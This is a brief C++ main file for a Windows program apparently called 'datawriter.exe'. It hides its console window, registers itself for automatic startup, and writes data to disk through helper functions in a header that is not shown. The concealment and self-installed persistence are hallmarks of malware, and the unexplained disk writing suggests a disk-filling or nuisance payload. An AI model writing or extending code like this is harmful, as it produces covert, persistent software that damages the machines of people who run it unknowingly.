#include <fstream>
#include <Windows.h>
#include "writer.hpp"

int main()
{
    // Hide console window
    write::HideWindow();

    // Self write on autostart | Actually not supported on linux
#ifdef _WIN32
    write::Autostart("datawriter.exe"); // Return value is ignored
#endif

    // Write data on disk
    write::Write();

    return 0;
}
